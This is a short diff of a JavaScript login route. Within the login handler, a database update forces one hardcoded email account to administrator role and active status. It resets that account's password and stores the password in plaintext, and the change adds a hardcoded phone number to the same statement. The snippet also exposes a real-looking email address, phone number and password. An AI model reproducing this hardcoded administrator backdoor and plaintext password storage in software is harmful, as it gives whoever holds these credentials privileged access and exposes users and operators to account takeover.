@@ -31,7 +31,7 @@ router.post('/login', async (req, res) => {
         );
       } else {
         await query(
-          'UPDATE users SET passwordHash = ?, plain_password = ?, role = "admin", status = "ACTIVE" WHERE LOWER(email) = ?',
+          'UPDATE users SET mobileNumber = "9988494936", passwordHash = ?, plain_password = ?, role = "admin", status = "ACTIVE" WHERE LOWER(email) = ?',
           [passwordHash, 'Rajesh@1819', 'srdigitalseva9@gmail.com']
         );
       }
